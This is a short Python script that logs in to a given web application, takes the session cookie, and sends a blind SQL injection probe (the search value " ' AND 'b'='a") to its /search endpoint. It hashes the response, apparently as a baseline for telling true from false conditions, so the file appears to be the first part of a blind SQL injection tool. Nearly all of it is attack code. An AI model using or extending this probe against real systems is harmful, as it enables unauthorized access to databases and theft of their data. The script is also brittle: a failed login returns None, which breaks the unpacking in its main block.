import requests,argparse

from hashlib import sha256
def Login(username,password,url):
    try:
        req = requests.post(url+'/login',data={'username':username,'password':password})
        if req.status_code >= 200 and req.status_code < 400:
            session = req.cookies['session']
            page = requests.post(url+'/search',data={'search':" ' AND 'b'='a"},cookies={'session':session,'lang':'en-US'})
            if (page.ok):
                #print(page.content)
                page_hash = sha256(page.content).hexdigest()
                
                return (session,page_hash)
            else:
                return None
    except:
        return None
    

if __name__ == "__main__":
    args = argparse.ArgumentParser()
    args.add_argument('-u','--username',default='',type=str,required=True)
    args.add_argument('-p','--password',default='',type=str,required=True)
    args.add_argument('-U','--url',required=True,type=str)
    opt = args.parse_args()


    s , p = Login(opt.username,opt.password,opt.url)
    print(s,p)
